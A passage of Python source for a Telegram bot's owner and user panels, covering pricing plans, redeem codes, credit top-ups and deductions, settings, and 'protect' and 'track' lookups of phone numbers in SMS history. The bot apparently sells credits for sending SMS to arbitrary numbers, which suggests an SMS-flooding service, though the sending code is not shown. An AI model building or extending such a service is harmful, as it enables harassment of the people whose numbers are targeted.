async def owner_pricing_credits_invalid(msg: Message):
    await msg.answer(f"{em(EMOJI_CROSS, '❌')} Sirf number.", parse_mode="HTML")

@R.message(S.add_plan_link, F.text)
async def owner_pricing_link(msg: Message, state: FSMContext):
    d = load()
    if not is_owner(msg.from_user.id, d):
        await state.clear(); return
    link = msg.text.strip()
    if not link.startswith("http"):
        await msg.answer(f"{em(EMOJI_CROSS, '❌')} Valid URL.", parse_mode="HTML"); return
    fsmd = await state.get_data()
    plan = {
        "id": f"{int(time.time())}_{uuid.uuid4().hex[:6]}",
        "name": fsmd.get("plan_name", "Plan"),
        "price": fsmd.get("plan_price", 0),
        "credits": fsmd.get("plan_credits", 0),
        "currency": "INR",
        "payment_link": link
    }
    d.setdefault("pricing", {}).setdefault("plans", []).append(plan)
    await safe_save(d)
    await state.clear()
    await msg.answer(f"{em(EMOJI_CHECK, '✅')} <b>Plan Added!</b>\n📋 {plan['name']}",
        reply_markup=kb([(sc('back'), "owner:pricing:menu")]), parse_mode="HTML")

@R.message(S.add_plan_link)
async def owner_pricing_link_invalid(msg: Message):
    await msg.answer(f"{em(EMOJI_CROSS, '❌')} Sirf URL.", parse_mode="HTML")

@R.callback_query(F.data == "owner:pricing:remove")
async def owner_pricing_remove(cq: CallbackQuery, state: FSMContext):
    d = load()
    if not is_owner(cq.from_user.id, d):
        await cq.answer("🚫", show_alert=True); return
    plans = d.get("pricing", {}).get("plans", [])
    if not plans:
        await cq.answer("❌ Koi plan nahi!", show_alert=True); return
    rows = []
    for plan in plans:
        rows.append([btn(f"{plan['name'][:25]}", f"owner:pricing:del:{plan['id']}", EMOJI_CROSS, "🗑")])
    rows.append([btn("ʙᴀᴄᴋ", "owner:pricing:menu", EMOJI_GEAR, "🔙")])
    await cq.message.edit_text(f"{em(EMOJI_CROSS, '🗑')} <b>Remove Plan</b>",
        reply_markup=InlineKeyboardMarkup(inline_keyboard=rows), parse_mode="HTML")

@R.callback_query(F.data.startswith("owner:pricing:del:"))
async def owner_pricing_del(cq: CallbackQuery, state: FSMContext):
    d = load()
    if not is_owner(cq.from_user.id, d):
        await cq.answer("🚫", show_alert=True); return
    plan_id = cq.data.split("owner:pricing:del:", 1)[1]
    plans = d.get("pricing", {}).get("plans", [])
    d["pricing"]["plans"] = [p for p in plans if p["id"] != plan_id]
    await safe_save(d)
    await cq.answer("🗑 Removed!")
    await owner_pricing_menu(cq, state)

# ================= REDEEM =================
@R.callback_query(F.data == "owner:redeem:menu")
async def owner_redeem_menu(cq: CallbackQuery, state: FSMContext):
    d = load()
    if not is_owner(cq.from_user.id, d):
        await cq.answer("🚫", show_alert=True); return
    codes = d.get("redeem_codes", {})
    text = f"{em(EMOJI_GIFT, '🎁')} <b>Redeem Codes</b>\n\nTotal: <b>{len(codes)}</b>\n\n"
    for code, data in list(codes.items())[:10]:
        status = "✅" if data.get("uses_left", 0) > 0 else "❌"
        text += f"<code>{code}</code> — 💰{data['credits']} — {status} ({data.get('uses_left', 0)} left)\n"
    rows = [
        [btn("ɢᴇɴᴇʀᴀᴛᴇ ᴄᴏᴅᴇ", "owner:redeem:gen", EMOJI_CHECK, "➕")],
        [btn("ᴅᴇʟᴇᴛᴇ", "owner:redeem:del", EMOJI_CROSS, "🗑")],
        [btn("ʙᴀᴄᴋ", "owner:home", EMOJI_GEAR, "🔙")]
    ]
    await cq.message.edit_text(text, reply_markup=InlineKeyboardMarkup(inline_keyboard=rows), parse_mode="HTML")

@R.callback_query(F.data == "owner:redeem:gen")
async def owner_redeem_gen_start(cq: CallbackQuery, state: FSMContext):
    d = load()
    if not is_owner(cq.from_user.id, d):
        await cq.answer("🚫", show_alert=True); return
    await state.set_state(S.gen_redeem_credits)
    await cq.message.edit_text(f"{em(EMOJI_GIFT, '🎁')} <b>Step 1/2</b>\n\nCredits:",
        reply_markup=kb([(sc('cancel'), "owner:redeem:menu")]), parse_mode="HTML")

@R.message(S.gen_redeem_credits, F.text)
async def owner_redeem_credits(msg: Message, state: FSMContext):
    if not is_owner(msg.from_user.id, load()):
        await state.clear(); return
    try:
        credits = int(msg.text.strip())
    except:
        await msg.answer(f"{em(EMOJI_CROSS, '❌')} Valid number.", parse_mode="HTML"); return
    await state.update_data(gen_credits=credits)
    await state.set_state(S.gen_redeem_uses)
    await msg.answer(f"{em(EMOJI_GIFT, '🎁')} <b>Step 2/2</b>\n\nMax uses:",
        reply_markup=kb([(sc('cancel'), "owner:redeem:menu")]), parse_mode="HTML")

@R.message(S.gen_redeem_credits)
async def owner_redeem_credits_invalid(msg: Message):
    await msg.answer(f"{em(EMOJI_CROSS, '❌')} Sirf number.", parse_mode="HTML")

@R.message(S.gen_redeem_uses, F.text)
async def owner_redeem_uses(msg: Message, state: FSMContext):
    d = load()
    if not is_owner(msg.from_user.id, d):
        await state.clear(); return
    try:
        uses = int(msg.text.strip())
        if uses < 1: raise ValueError
    except:
        await msg.answer(f"{em(EMOJI_CROSS, '❌')} Valid number (>=1).", parse_mode="HTML"); return
    fsmd = await state.get_data()
    credits = fsmd.get("gen_credits", 10)
    while True:
        code = "GIFT" + "".join(random.choices(string.ascii_uppercase + string.digits, k=8))
        if code not in d.get("redeem_codes", {}): break
    d.setdefault("redeem_codes", {})[code] = {
        "credits": credits, "uses_left": uses,
        "created_by": msg.from_user.id, "created_at": int(time.time()), "used_by": []}
    await safe_save(d)
    await state.clear()
    await msg.answer(f"{em(EMOJI_GIFT, '🎉')} <b>Code Generated!</b>\n\n🎁 <code>{code}</code>\n💰 {credits}\n🔢 Uses: {uses}",
        reply_markup=kb([(sc('back'), "owner:redeem:menu")]), parse_mode="HTML")

@R.message(S.gen_redeem_uses)
async def owner_redeem_uses_invalid(msg: Message):
    await msg.answer(f"{em(EMOJI_CROSS, '❌')} Sirf number.", parse_mode="HTML")

@R.callback_query(F.data == "owner:redeem:del")
async def owner_redeem_del_menu(cq: CallbackQuery, state: FSMContext):
    d = load()
    if not is_owner(cq.from_user.id, d):
        await cq.answer("🚫", show_alert=True); return
    codes = d.get("redeem_codes", {})
    if not codes:
        await cq.answer("❌ Koi code nahi!", show_alert=True); return
    rows = []
    for code in list(codes.keys())[:20]:
        rows.append([btn(code, f"owner:redeem:deldo:{code}", EMOJI_CROSS, "🗑")])
    rows.append([btn("ʙᴀᴄᴋ", "owner:redeem:menu", EMOJI_GEAR, "🔙")])
    await cq.message.edit_text(f"{em(EMOJI_CROSS, '🗑')} <b>Delete Code</b>",
        reply_markup=InlineKeyboardMarkup(inline_keyboard=rows), parse_mode="HTML")

@R.callback_query(F.data.startswith("owner:redeem:deldo:"))
async def owner_redeem_del_do(cq: CallbackQuery, state: FSMContext):
    d = load()
    if not is_owner(cq.from_user.id, d):
        await cq.answer("🚫", show_alert=True); return
    code = cq.data.split("owner:redeem:deldo:", 1)[1]
    if code in d.get("redeem_codes", {}):
        del d["redeem_codes"][code]
        await safe_save(d)
    await cq.answer("🗑 Deleted!")
    await owner_redeem_menu(cq, state)

# ================= CREDITS =================
@R.callback_query(F.data == "owner:credits:add")
async def owner_credits_add_start(cq: CallbackQuery, state: FSMContext):
    d = load()
    if not is_owner(cq.from_user.id, d):
        await cq.answer("🚫", show_alert=True); return
    await state.set_state(S.add_credits_uid)
    await cq.message.edit_text(f"{em(EMOJI_MONEY, '💰')} <b>Step 1/2</b>\n\nUser ID:",
        reply_markup=kb([(sc('cancel'), "owner:home")]), parse_mode="HTML")

@R.message(S.add_credits_uid, F.text)
async def owner_credits_add_uid(msg: Message, state: FSMContext):
    if not is_owner(msg.from_user.id, load()):
        await state.clear(); return
    try:
        uid = int(msg.text.strip())
    except:
        await msg.answer(f"{em(EMOJI_CROSS, '❌')} Valid ID.", parse_mode="HTML"); return
    await state.update_data(credit_uid=uid)
    await state.set_state(S.add_credits_amount)
    await msg.answer(f"{em(EMOJI_MONEY, '💰')} <b>Step 2/2</b>\n\nAmount:",
        reply_markup=kb([(sc('cancel'), "owner:home")]), parse_mode="HTML")

@R.message(S.add_credits_uid)
async def owner_credits_add_uid_invalid(msg: Message):
    await msg.answer(f"{em(EMOJI_CROSS, '❌')} Sirf ID.", parse_mode="HTML")

@R.message(S.add_credits_amount, F.text)
async def owner_credits_add_amount(msg: Message, state: FSMContext):
    d = load()
    if not is_owner(msg.from_user.id, d):
        await state.clear(); return
    try:
        amount = int(msg.text.strip())
    except:
        await msg.answer(f"{em(EMOJI_CROSS, '❌')} Valid number.", parse_mode="HTML"); return
    fsmd = await state.get_data()
    uid = fsmd.get("credit_uid")
    add_credits(uid, amount, d)
    await safe_save(d)
    await state.clear()
    try:
        await msg.bot.send_message(uid, f"{em(EMOJI_MONEY, '💰')} <b>+{amount} credits!</b>\n💳 Balance: {get_user_credits(uid, d)}", parse_mode="HTML")
    except: pass
    await msg.answer(f"{em(EMOJI_CHECK, '✅')} <b>{amount} added</b> to <code>{uid}</code>\n💳 Balance: <b>{get_user_credits(uid, d)}</b>",
        reply_markup=kb([(sc('back'), "owner:home")]), parse_mode="HTML")

@R.message(S.add_credits_amount)
async def owner_credits_add_amount_invalid(msg: Message):
    await msg.answer(f"{em(EMOJI_CROSS, '❌')} Sirf number.", parse_mode="HTML")

@R.callback_query(F.data == "owner:credits:deduct")
async def owner_credits_deduct_start(cq: CallbackQuery, state: FSMContext):
    d = load()
    if not is_owner(cq.from_user.id, d):
        await cq.answer("🚫", show_alert=True); return
    await state.set_state(S.deduct_credits_uid)
    await cq.message.edit_text(f"{em(EMOJI_MONEY, '💰')} <b>Deduct - Step 1/2</b>\n\nUser ID:",
        reply_markup=kb([(sc('cancel'), "owner:home")]), parse_mode="HTML")

@R.message(S.deduct_credits_uid, F.text)
async def owner_credits_deduct_uid(msg: Message, state: FSMContext):
    if not is_owner(msg.from_user.id, load()):
        await state.clear(); return
    try:
        uid = int(msg.text.strip())
    except:
        await msg.answer(f"{em(EMOJI_CROSS, '❌')} Valid ID.", parse_mode="HTML"); return
    await state.update_data(deduct_uid=uid)
    await state.set_state(S.deduct_credits_amount)
    await msg.answer(f"{em(EMOJI_MONEY, '💰')} <b>Step 2/2</b>\n\nAmount:",
        reply_markup=kb([(sc('cancel'), "owner:home")]), parse_mode="HTML")

@R.message(S.deduct_credits_uid)
async def owner_credits_deduct_uid_invalid(msg: Message):
    await msg.answer(f"{em(EMOJI_CROSS, '❌')} Sirf ID.", parse_mode="HTML")

@R.message(S.deduct_credits_amount, F.text)
async def owner_credits_deduct_amount(msg: Message, state: FSMContext):
    d = load()
    if not is_owner(msg.from_user.id, d):
        await state.clear(); return
    try:
        amount = int(msg.text.strip())
    except:
        await msg.answer(f"{em(EMOJI_CROSS, '❌')} Valid number.", parse_mode="HTML"); return
    fsmd = await state.get_data()
    uid = fsmd.get("deduct_uid")
    success = deduct_credits(uid, amount, d)
    if success:
        await safe_save(d)
        await state.clear()
        try:
            await msg.bot.send_message(uid, f"{em(EMOJI_WARNING, '⚠️')} -{amount} credits\n💳 Balance: {get_user_credits(uid, d)}", parse_mode="HTML")
        except: pass
        await msg.answer(f"{em(EMOJI_CHECK, '✅')} <b>{amount} deducted</b>\n💳 Balance: <b>{get_user_credits(uid, d)}</b>",
            reply_markup=kb([(sc('back'), "owner:home")]), parse_mode="HTML")
    else:
        await state.clear()
        await msg.answer(f"{em(EMOJI_CROSS, '❌')} Insufficient! Sirf {get_user_credits(uid, d)} credits hain.",
            reply_markup=kb([(sc('back'), "owner:home")]), parse_mode="HTML")

@R.message(S.deduct_credits_amount)
async def owner_credits_deduct_amount_invalid(msg: Message):
    await msg.answer(f"{em(EMOJI_CROSS, '❌')} Sirf number.", parse_mode="HTML")

# ================= ADD/DEDUCT ALL =================
@R.callback_query(F.data == "owner:add_all_credits")
async def owner_add_all_credits_start(cq: CallbackQuery, state: FSMContext):
    d = load()
    if not is_owner(cq.from_user.id, d):
        await cq.answer("🚫", show_alert=True); return
    await state.set_state(S.add_all_credits_amount)
    await cq.message.edit_text(
        f"{em(EMOJI_MONEY, '💰')} <b>Add to ALL Users</b>\n\nAmount:",
        reply_markup=kb([(sc('cancel'), "owner:home")]), parse_mode="HTML")

@R.message(S.add_all_credits_amount, F.text)
async def owner_add_all_credits_done(msg: Message, state: FSMContext):
    d = load()
    uid = msg.from_user.id
    if not is_owner(uid, d):
        await state.clear(); return
    try:
        amount = int(msg.text.strip())
        if amount <= 0: raise ValueError
    except:
        await msg.answer(f"{em(EMOJI_CROSS, '❌')} Valid positive number.", parse_mode="HTML"); return
    await state.clear()
    users = d.get("users", {})
    if not users:
        await msg.answer(f"{em(EMOJI_CROSS, '❌')} Koi user nahi!", reply_markup=kb([(sc('back'), "owner:home")]), parse_mode="HTML"); return
    count = 0
    for uid_str in users:
        add_credits(int(uid_str), amount, d)
        count += 1
    await safe_save(d)
    notification = (
        f"{em(EMOJI_MONEY, '💰')} <b>Credits Added!</b>\n\n"
        f"🎉 +<b>{amount}</b> credits mile!\n"
        f"💳 Check: /start")
    success = 0
    for uid_str in users:
        try:
            await msg.bot.send_message(int(uid_str), notification, parse_mode="HTML")
            success += 1
            await asyncio.sleep(0.05)
        except: pass
    await msg.answer(f"{em(EMOJI_CHECK, '✅')} <b>Done!</b>\n💰 {amount} each\n👥 {count} users\n📨 {success} notified",
        reply_markup=kb([(sc('back'), "owner:home")]), parse_mode="HTML")
    log_activity(d, "add_credits_all", uid, f"{amount} to {count}")

@R.message(S.add_all_credits_amount)
async def owner_add_all_credits_invalid(msg: Message):
    await msg.answer(f"{em(EMOJI_CROSS, '❌')} Sirf number.", parse_mode="HTML")

@R.callback_query(F.data == "owner:deduct_all_credits")
async def owner_deduct_all_credits_start(cq: CallbackQuery, state: FSMContext):
    d = load()
    if not is_owner(cq.from_user.id, d):
        await cq.answer("🚫", show_alert=True); return
    await state.set_state(S.deduct_all_credits_amount)
    await cq.message.edit_text(
        f"{em(EMOJI_MONEY, '💰')} <b>Deduct from ALL</b>\n\nAmount (owners/admins skip):",
        reply_markup=kb([(sc('cancel'), "owner:home")]), parse_mode="HTML")

@R.message(S.deduct_all_credits_amount, F.text)
async def owner_deduct_all_credits_done(msg: Message, state: FSMContext):
    d = load()
    uid = msg.from_user.id
    if not is_owner(uid, d):
        await state.clear(); return
    try:
        amount = int(msg.text.strip())
        if amount <= 0: raise ValueError
    except:
        await msg.answer(f"{em(EMOJI_CROSS, '❌')} Valid positive number.", parse_mode="HTML"); return
    await state.clear()
    users = d.get("users", {})
    if not users:
        await msg.answer(f"{em(EMOJI_CROSS, '❌')} Koi user nahi!", reply_markup=kb([(sc('back'), "owner:home")]), parse_mode="HTML"); return
    count = 0
    total = 0
    owners = d.get("owners", [MAIN_OWNER])
    admins = d.get("admins", [])
    for uid_str, udata in users.items():
        user_id = int(uid_str)
        if user_id in owners or user_id in admins: continue
        current = udata.get("credits", 0)
        if current >= amount:
            udata["credits"] = current - amount
            count += 1; total += amount
        elif current > 0:
            udata["credits"] = 0
            count += 1; total += current
    await safe_save(d)
    await msg.answer(f"{em(EMOJI_CHECK, '✅')} <b>Deducted!</b>\n💰 {amount} each\n👥 {count} users\n📊 Total: {total}",
        reply_markup=kb([(sc('back'), "owner:home")]), parse_mode="HTML")
    log_activity(d, "deduct_credits_all", uid, f"{total} from {count}")

@R.message(S.deduct_all_credits_amount)
async def owner_deduct_all_credits_invalid(msg: Message):
    await msg.answer(f"{em(EMOJI_CROSS, '❌')} Sirf number.", parse_mode="HTML")

# ================= SETTINGS =================
@R.callback_query(F.data == "owner:settings")
async def owner_settings(cq: CallbackQuery, state: FSMContext):
    d = load()
    if not is_owner(cq.from_user.id, d):
        await cq.answer("🚫", show_alert=True); return
    settings = d.get("settings", {})
    auto_status = "🟢 ON" if settings.get("auto_cleanup", True) else "🔴 OFF"
    text = (
        f"{em(EMOJI_GEAR, '⚙️')} <b>Settings</b>\n\n"
        f"🎁 Ref Credits: <b>{settings.get('ref_credits', 3)}</b>\n"
        f"👑 Max Owners: <b>{settings.get('max_owners', 6)}</b>\n"
        f"🛡 Max Admins: <b>{settings.get('max_admins', 20)}</b>\n"
        f"🗑 Auto Cleanup: <b>{auto_status}</b>\n"
        f"<i>(3 consecutive zero-scans → auto delete)</i>")
    rows = [
        [btn("sᴇᴛ ʀᴇғ ᴄʀᴇᴅɪᴛs", "owner:settings:ref", EMOJI_GIFT, "🎁")],
        [btn("sᴇᴛ ᴍᴀx ᴀᴅᴍɪɴs", "owner:settings:max_admins", EMOJI_SHIELD, "🛡")],
        [InlineKeyboardButton(
            text=f"🗑 ᴀᴜᴛᴏ-ᴄʟᴇᴀɴᴜᴘ: {'🟢 ᴏɴ' if settings.get('auto_cleanup', True) else '🔴 ᴏғғ'}",
            callback_data="owner:settings:auto_cleanup_toggle")],
        [btn("ʙᴀᴄᴋ", "owner:home", EMOJI_GEAR, "🔙")]
    ]
    await cq.message.edit_text(text, reply_markup=InlineKeyboardMarkup(inline_keyboard=rows), parse_mode="HTML")

@R.callback_query(F.data == "owner:settings:ref")
async def owner_settings_ref(cq: CallbackQuery, state: FSMContext):
    d = load()
    if not is_owner(cq.from_user.id, d):
        await cq.answer("🚫", show_alert=True); return
    await state.set_state(S.set_ref_credits)
    await cq.message.edit_text(f"{em(EMOJI_GIFT, '🎁')} <b>Referral Credits</b>\n\nNew value:",
        reply_markup=kb([(sc('cancel'), "owner:settings")]), parse_mode="HTML")

@R.message(S.set_ref_credits, F.text)
async def owner_settings_ref_done(msg: Message, state: FSMContext):
    d = load()
    if not is_owner(msg.from_user.id, d):
        await state.clear(); return
    try:
        credits = int(msg.text.strip())
        if credits < 0: raise ValueError
    except:
        await msg.answer(f"{em(EMOJI_CROSS, '❌')} Valid.", parse_mode="HTML"); return
    d.setdefault("settings", {})["ref_credits"] = credits
    d["premium"]["ref_credits"] = credits
    await safe_save(d)
    await state.clear()
    await msg.answer(f"{em(EMOJI_CHECK, '✅')} Ref credits = <b>{credits}</b>",
        reply_markup=kb([(sc('back'), "owner:settings")]), parse_mode="HTML")

@R.message(S.set_ref_credits)
async def owner_settings_ref_invalid(msg: Message):
    await msg.answer(f"{em(EMOJI_CROSS, '❌')} Sirf number.", parse_mode="HTML")

@R.callback_query(F.data == "owner:settings:max_admins")
async def owner_settings_max_admins(cq: CallbackQuery, state: FSMContext):
    d = load()
    if not is_owner(cq.from_user.id, d):
        await cq.answer("🚫", show_alert=True); return
    await state.set_state(S.set_max_admins)
    cur = d.get("settings", {}).get("max_admins", 20)
    await cq.message.edit_text(f"{em(EMOJI_SHIELD, '🛡')} <b>Max Admins</b>\n\nCurrent: <b>{cur}</b>\n\nNew value:",
        reply_markup=kb([(sc('cancel'), "owner:settings")]), parse_mode="HTML")

@R.message(S.set_max_admins, F.text)
async def owner_settings_max_admins_done(msg: Message, state: FSMContext):
    d = load()
    if not is_owner(msg.from_user.id, d):
        await state.clear(); return
    try:
        val = int(msg.text.strip())
        if val < 1: raise ValueError
    except:
        await msg.answer(f"{em(EMOJI_CROSS, '❌')} Valid number (>=1).", parse_mode="HTML"); return
    d.setdefault("settings", {})["max_admins"] = val
    await safe_save(d)
    await state.clear()
    await msg.answer(f"{em(EMOJI_CHECK, '✅')} Max admins = <b>{val}</b>",
        reply_markup=kb([(sc('back'), "owner:settings")]), parse_mode="HTML")

@R.message(S.set_max_admins)
async def owner_settings_max_admins_invalid(msg: Message):
    await msg.answer(f"{em(EMOJI_CROSS, '❌')} Sirf number.", parse_mode="HTML")

@R.callback_query(F.data == "owner:settings:auto_cleanup_toggle")
async def owner_settings_auto_cleanup_toggle(cq: CallbackQuery, state: FSMContext):
    d = load()
    if not is_owner(cq.from_user.id, d):
        await cq.answer("🚫 Owner only!", show_alert=True); return
    settings = d.setdefault("settings", {})
    current = settings.get("auto_cleanup", True)
    settings["auto_cleanup"] = not current
    await safe_save(d)
    global AUTO_CLEANUP_ENABLED
    AUTO_CLEANUP_ENABLED = settings["auto_cleanup"]
    status = "🟢 ENABLED" if settings["auto_cleanup"] else "🔴 DISABLED"
    await cq.answer(f"Auto-cleanup: {status}", show_alert=True)
    d = load()
    settings = d.get("settings", {})
    auto_status = "🟢 ON" if settings.get("auto_cleanup", True) else "🔴 OFF"
    text = (
        f"{em(EMOJI_GEAR, '⚙️')} <b>Settings</b>\n\n"
        f"🎁 Ref Credits: <b>{settings.get('ref_credits', 3)}</b>\n"
        f"👑 Max Owners: <b>{settings.get('max_owners', 6)}</b>\n"
        f"🛡 Max Admins: <b>{settings.get('max_admins', 20)}</b>\n"
        f"🗑 Auto Cleanup: <b>{auto_status}</b>\n"
        f"<i>(3 consecutive zero-scans → auto delete)</i>")
    rows = [
        [btn("sᴇᴛ ʀᴇғ ᴄʀᴇᴅɪᴛs", "owner:settings:ref", EMOJI_GIFT, "🎁")],
        [btn("sᴇᴛ ᴍᴀx ᴀᴅᴍɪɴs", "owner:settings:max_admins", EMOJI_SHIELD, "🛡")],
        [InlineKeyboardButton(
            text=f"🗑 ᴀᴜᴛᴏ-ᴄʟᴇᴀɴᴜᴘ: {'🟢 ᴏɴ' if settings.get('auto_cleanup', True) else '🔴 ᴏғғ'}",
            callback_data="owner:settings:auto_cleanup_toggle")],
        [btn("ʙᴀᴄᴋ", "owner:home", EMOJI_GEAR, "🔙")]
    ]
    await cq.message.edit_text(text, reply_markup=InlineKeyboardMarkup(inline_keyboard=rows), parse_mode="HTML")

# ================= ACTIVITY LOG =================
@R.callback_query(F.data == "owner:activity")
async def owner_activity_log(cq: CallbackQuery, state: FSMContext):
    d = load()
    if not is_owner(cq.from_user.id, d):
        await cq.answer("🚫", show_alert=True); return
    log_entries = d.get("activity_log", [])[-20:]
    if not log_entries:
        text = f"{em(EMOJI_GEAR, '📜')} <b>Activity Log</b>\n\n<i>Empty.</i>"
    else:
        lines = [f"{em(EMOJI_GEAR, '📜')} <b>Recent Activity</b>\n"]
        for entry in reversed(log_entries):
            ts = fmt_time(entry.get("timestamp", 0))
            lines.append(f"[{ts}] <code>{entry.get('uid', 0)}</code> — <b>{entry.get('action')}</b> — {entry.get('details', '')}")
        text = "\n".join(lines)
    await cq.message.edit_text(text, reply_markup=kb([(sc('refresh'), "owner:activity"), (sc('back'), "owner:home")]), parse_mode="HTML")

@R.callback_query(F.data == "owner:sms_history")
async def owner_sms_history(cq: CallbackQuery, state: FSMContext):
    d = load()
    if not is_owner(cq.from_user.id, d):
        await cq.answer("🚫", show_alert=True); return
    all_hist = d.get("sms_history", {})
    total = sum(len(v) for v in all_hist.values())
    text = f"{em(EMOJI_STAR, '📋')} <b>Global SMS History</b>\n\nTotal: <b>{total}</b>\n\n<i>Per-user history unke stats me hai.</i>"
    await cq.message.edit_text(text, reply_markup=kb([(sc('back'), "owner:home")]), parse_mode="HTML")

# ================= PROTECT =================
@R.callback_query(F.data == "owner:protect")
async def owner_protect_start(cq: CallbackQuery, state: FSMContext):
    d = load()
    if not is_owner(cq.from_user.id, d):
        await cq.answer("🚫", show_alert=True); return
    await state.set_state(S.protect_number)
    await cq.message.edit_text(f"{em(EMOJI_LOCK, '🔒')} <b>Protect Number</b>\n\nNumber bhejo:",
        reply_markup=kb([(sc('cancel'), "owner:home")]), parse_mode="HTML")

@R.message(S.protect_number, F.text)
async def owner_protect_done(msg: Message, state: FSMContext):
    d = load()
    uid = msg.from_user.id
    if not is_owner(uid, d):
        await state.clear(); return
    number = msg.text.strip()
    if not number.replace("+", "").replace(" ", "").isdigit() or len(number) < 7:
        await msg.answer(f"{em(EMOJI_CROSS, '❌')} Invalid number.", parse_mode="HTML"); return
    PROTECTED_NUMBERS[number] = uid
    d["protected_numbers"] = PROTECTED_NUMBERS
    await safe_save(d)
    await state.clear()
    await msg.answer(f"{em(EMOJI_LOCK, '🔒')} <b>Protected!</b>\n<code>{number}</code>",
        reply_markup=kb([(sc('back'), "owner:home")]), parse_mode="HTML")
    log_activity(d, "number_protected", uid, number)

@R.message(S.protect_number)
async def owner_protect_invalid(msg: Message):
    await msg.answer(f"{em(EMOJI_CROSS, '❌')} Sirf number.", parse_mode="HTML")

@R.callback_query(F.data == "owner:protected_list")
async def owner_protected_list(cq: CallbackQuery, state: FSMContext):
    d = load()
    uid = cq.from_user.id
    if not is_admin(uid, d):
        await cq.answer("🚫", show_alert=True); return
    protected = d.get("protected_numbers", {})
    if not protected:
        await cq.message.edit_text(f"{em(EMOJI_LOCK, '🔐')} <b>Protected List</b>\n\n<i>Koi nahi.</i>",
            reply_markup=kb([(sc('back'), "owner:home")]), parse_mode="HTML"); return
    lines = [f"{em(EMOJI_LOCK, '🔐')} <b>Protected Numbers</b>\n"]
    is_owner_user = is_owner(uid, d) or is_main_owner(uid)
    for number, protector_uid in protected.items():
        disp = number if is_owner_user else mask_number(number)
        pdata = d.get("users", {}).get(str(protector_uid), {})
        lines.append(f"📞 <code>{disp}</code>\n   By: <code>{protector_uid}</code> ({pdata.get('name', 'Unknown')})\n")
    rows = []
    if is_owner_user:
        rows.append([btn("ʀᴇᴍᴏᴠᴇ", "owner:protected_remove", EMOJI_CROSS, "🗑")])
    rows.append([btn("ʙᴀᴄᴋ", "owner:home", EMOJI_GEAR, "🔙")])
    await cq.message.edit_text("\n".join(lines), reply_markup=InlineKeyboardMarkup(inline_keyboard=rows), parse_mode="HTML")

@R.callback_query(F.data == "owner:protected_remove")
async def owner_protected_remove_menu(cq: CallbackQuery, state: FSMContext):
    d = load()
    uid = cq.from_user.id
    if not (is_owner(uid, d) or is_main_owner(uid)):
        await cq.answer("🚫", show_alert=True); return
    protected = d.get("protected_numbers", {})
    if not protected:
        await cq.answer("❌ Koi nahi!", show_alert=True); return
    rows = []
    for number in protected:
        rows.append([btn(number, f"owner:protected_del:{number}", EMOJI_CROSS, "🗑")])
    rows.append([btn("ʙᴀᴄᴋ", "owner:protected_list", EMOJI_GEAR, "🔙")])
    await cq.message.edit_text(f"{em(EMOJI_CROSS, '🗑')} <b>Remove Protection</b>",
        reply_markup=InlineKeyboardMarkup(inline_keyboard=rows), parse_mode="HTML")

@R.callback_query(F.data.startswith("owner:protected_del:"))
async def owner_protected_del(cq: CallbackQuery, state: FSMContext):
    d = load()
    uid = cq.from_user.id
    if not (is_owner(uid, d) or is_main_owner(uid)):
        await cq.answer("🚫", show_alert=True); return
    number = cq.data.split("owner:protected_del:", 1)[1]
    if number in d.get("protected_numbers", {}):
        del d["protected_numbers"][number]
        await safe_save(d)
        global PROTECTED_NUMBERS
        PROTECTED_NUMBERS = d["protected_numbers"]
        await cq.answer(f"✅ Removed!", show_alert=True)
    else:
        await cq.answer("❌ Not found!", show_alert=True)
    await owner_protected_list(cq, state)

# ================= TRACK =================
@R.callback_query(F.data == "owner:track")
async def owner_track_start(cq: CallbackQuery, state: FSMContext):
    d = load()
    if not is_owner(cq.from_user.id, d):
        await cq.answer("🚫", show_alert=True); return
    await state.set_state(S.track_number)
    await cq.message.edit_text(f"{em(EMOJI_STAR, '📊')} <b>Track Number</b>\n\nNumber bhejo:",
        reply_markup=kb([(sc('cancel'), "owner:home")]), parse_mode="HTML")

@R.message(S.track_number, F.text)
async def owner_track_done(msg: Message, state: FSMContext):
    d = load()
    uid = msg.from_user.id
    if not is_owner(uid, d):
        await state.clear(); return
    number = msg.text.strip()
    if not number.replace("+", "").replace(" ", "").isdigit() or len(number) < 7:
        await msg.answer(f"{em(EMOJI_CROSS, '❌')} Invalid.", parse_mode="HTML"); return
    await state.clear()
    all_hist = d.get("sms_history", {})
    users_who_sent = []
    for uid_str, hist_list in all_hist.items():
        for entry in hist_list:
            if entry.get("number") == number:
                ud = d.get("users", {}).get(uid_str, {})
                users_who_sent.append({
                    "uid": int(uid_str), "name": ud.get("name", "Unknown"),
                    "timestamp": entry.get("timestamp", 0)})
                break
    if not users_who_sent:
        await msg.answer(f"{em(EMOJI_STAR, '📊')} <b>Tracker</b>\n\n📞 <code>{number}</code>\n\n❌ Kisi ne nahi bheja.",
            reply_markup=kb([(sc('back'), "owner:home")]), parse_mode="HTML"); return
    lines = [f"{em(EMOJI_STAR, '📊')} <b>Tracker</b>\n\n📞 <code>{number}</code>\n\n👥 Users:\n"]
    for e in users_who_sent:
        lines.append(f"• <code>{e['uid']}</code> — {e['name'][:20]} — {fmt_time(e['timestamp'])}")
    await msg.answer("\n".join(lines), reply_markup=kb([(sc('back'), "owner:home")]), parse_mode="HTML")

@R.message(S.track_number)
async def owner_track_invalid(msg: Message):
    await msg.answer(f"{em(EMOJI_CROSS, '❌')} Sirf number.", parse_mode="HTML")

# ================= USER PANEL =================
@R.callback_query(F.data == "user:credits")
async def user_credits(cq: CallbackQuery, state: FSMContext):
    d = load()
    uid = cq.from_user.id
    await cq.answer(f"💰 Credits: {get_user_credits(uid, d)}", show_alert=True)

@R.callback_query(F.data == "user:redeem")
async def user_redeem_start(cq: CallbackQuery, state: FSMContext):
    await state.set_state(S.redeem_code)
    await cq.message.edit_text(f"{em(EMOJI_GIFT, '🎁')} <b>Redeem Code</b>\n\nCode bhejo:",
        reply_markup=kb([(sc('cancel'), "user:home")]), parse_mode="HTML")

@R.message(S.redeem_code, F.text)
async def user_redeem_done(msg: Message, state: FSMContext):
    d = load()
    uid = msg.from_user.id
    code = msg.text.strip().upper()
    await state.clear()
    codes = d.get("redeem_codes", {})
    if code not in codes:
        await msg.answer(f"{em(EMOJI_CROSS, '❌')} Invalid code!",
            reply_markup=kb([(sc('home'), "user:home")]), parse_mode="HTML"); return
    cd = codes[code]
    if cd.get("uses_left", 0) <= 0:
        await msg.answer(f"{em(EMOJI_CROSS, '❌')} Expire ho gaya!",
            reply_markup=kb([(sc('home'), "user:home")]), parse_mode="HTML"); return
    if uid in cd.get("used_by", []):
        await msg.answer(f"{em(EMOJI_CROSS, '❌')} Pehle use kar chuke!",
